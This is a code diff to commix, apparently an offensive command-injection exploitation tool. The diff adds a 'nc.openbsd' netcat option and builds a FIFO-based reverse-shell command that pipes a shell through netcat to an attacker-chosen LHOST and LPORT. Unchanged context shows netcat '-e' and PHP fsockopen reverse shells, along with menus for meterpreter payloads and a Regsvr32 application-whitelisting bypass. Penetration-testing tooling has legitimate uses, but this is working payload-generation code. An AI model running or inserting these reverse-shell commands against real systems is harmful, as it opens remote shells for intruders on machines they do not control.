@@ -204,7 +204,8 @@ def netcat_version():
   NETCAT_ALTERNATIVES = [
     "nc",
     "busybox nc",
-    "nc.traditional"
+    "nc.traditional",
+    "nc.openbsd"
   ]
 
   while True:
@@ -213,8 +214,8 @@ def netcat_version():
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
-
-commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
+Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host. 
+\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
     
     # Default Netcat
     if nc_version == '1':
@@ -227,6 +228,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
     # Netcat-Traditional 
     elif nc_version == '3':
       nc_alternative = NETCAT_ALTERNATIVES[2]
+      break
+    # Netcat-Openbsd (nc without -e) 
+    elif nc_version == '4':
+      nc_alternative = NETCAT_ALTERNATIVES[3]
       break
     # Check for available shell options  
     elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
@@ -260,7 +265,14 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
       print settings.print_error_msg(err_msg)
       pass
 
-  cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell
+  if nc_version != '4':
+    # Netcat with -e
+    cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell
+  else:
+    # nc without -e 
+    cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
+           nc_alternative + " " + settings.LHOST + " " + settings.LPORT + \
+           " 1>/tmp/f\""
 
   return cmd
 
@@ -283,8 +295,8 @@ Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpr
 Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
 Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
 Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web delivery script. 
-
-commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
+    
     # PHP-reverse-shell
     if other_shell == '1':
       other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
@@ -432,8 +444,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe application whitelisting bypass.
-
-commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
           if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
             if shell_options(windows_reverse_shell):
@@ -551,8 +562,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meterpreter reverse TCP shell.
-
-commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
 
         if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):  
           if shell_options(web_delivery):
@@ -634,8 +644,7 @@ def reverse_tcp_options():
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat reverse TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.
-
-commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
 
     if reverse_tcp_option.lower() == "reverse_tcp": 
       warn_msg = "You are already into the '" + reverse_tcp_option.lower() + "' mode."
